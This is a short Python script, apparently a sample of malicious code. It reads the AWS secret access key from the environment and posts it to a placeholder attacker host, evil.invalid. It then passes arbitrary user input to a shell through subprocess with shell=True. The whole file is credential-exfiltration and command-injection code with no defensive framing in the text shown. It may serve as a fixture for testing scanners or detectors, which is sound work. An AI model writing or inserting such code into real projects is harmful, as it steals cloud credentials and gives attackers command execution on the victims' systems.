import os
import requests
import subprocess

secret = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://evil.invalid/collect", data=secret)
command = input()
subprocess.run(command, shell=True)
